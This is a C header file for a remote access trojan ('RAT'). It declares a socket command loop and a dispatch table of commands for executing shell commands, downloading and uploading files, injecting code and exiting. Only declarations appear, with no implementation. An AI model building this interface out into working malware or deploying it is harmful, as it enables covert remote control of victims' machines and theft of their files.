#ifndef _SERVER_H
#define _SERVER_H

#include "common.h"

typedef unsigned int SOCKET;
typedef int BOOL;

#define TRUE ((int)1)
#define FALSE ((int)0)

void enter_cmd_loop(IN SOCKET *s, IN struct sockaddr_in *clientaddr);
void nolastslash(OUT char *s);
void ntpath(OUT char *s);
void unixpath(OUT char *s);
char *last_unixpath(IN char *s);
const char *to_next_space(IN const char *s);
const char *to_next_non_space(IN const char *s);

void p_err(const char *s);
void p_success(const char *s);
void p_status(const char *s);

void handle_signals(int signo);

/*
    * core functionalities:
    *    serv_EXEC:    execute shell commands
    *    serv_GET:     download file
    *    serv_PUT:     upload file
    *    serv_EXIT:    close RAT
*/
BOOL serv_EXEC(IN SOCKET *s, IN const char *params);
BOOL serv_GET(IN SOCKET *s, IN const char *params);
BOOL serv_PUT(IN SOCKET *s, IN const char *params);
BOOL serv_LOCAL(IN SOCKET *s, IN const char *params);
BOOL serv_HELP(IN SOCKET *s, IN const char *params);
BOOL serv_INJECT(IN SOCKET *s, IN const char *params);
BOOL serv_EXIT(IN SOCKET *s, IN const char *params);

typedef BOOL(*SERV_FUNC) (
    IN SOCKET *s,
    IN const char *params
);

#define SERV_MAX_CMDS 7

#define MAX_SERV_CMD_FUNC_SZ 31 // max size of each const char *serv_cmd_funcs below

static const char *serv_cmd_funcs[SERV_MAX_CMDS] = {
    "!exec", "!get", "!put",
    "!local", "!help", "!inject",
    "!exit"
};

static const SERV_FUNC serv_funcs[SERV_MAX_CMDS] = {
    serv_EXEC, serv_GET, serv_PUT,
    serv_LOCAL, serv_HELP, serv_INJECT,
    serv_EXIT
};

#endif